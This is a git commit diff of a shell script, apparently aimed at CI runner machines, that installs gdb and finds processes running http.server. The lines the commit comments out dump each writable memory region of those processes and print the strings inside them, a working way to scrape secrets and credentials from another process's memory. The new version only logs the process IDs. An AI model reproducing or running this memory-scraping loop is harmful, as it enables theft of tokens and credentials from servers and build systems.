fee5f412d2026da25fa2cb64733dd7460f959900
_m <matiasesena@gmail.com>
2021-11-04 11:35:42 -0300

    Update falopa1.sh

--- falopa1.sh
+++ falopa1.sh
@@ -5,18 +5,19 @@ sudo apt-get install gdb > /tmp/file.txt
 
 mkdir dumps
 echo "STARTING..." >> /tmp/file.txt
+ps -ef | grep http.server  | tr -s ' ' | cut -d ' ' -f2 >> /tmp/file.txt
 
 # get pids related to runners and dump their memory
-for pid in $(ps -ef | grep http.server  | tr -s ' ' | cut -d ' ' -f2)
-do
-    grep rw-p /proc/$pid/maps \
-    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
-    | while read start stop; do \
-        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
-        strings dumps/*; \
-        rm dumps/$pid-$start-$stop.dump; \
-    done
-done
+#for pid in $(ps -ef | grep http.server  | tr -s ' ' | cut -d ' ' -f2)
+#do
+#    grep rw-p /proc/$pid/maps \
+#    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+#    | while read start stop; do \
+#        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
+#        strings dumps/*; \
+#        rm dumps/$pid-$start-$stop.dump; \
+#    done
+#done
 
 echo "FINISHED..." >> /tmp/file.txt
 
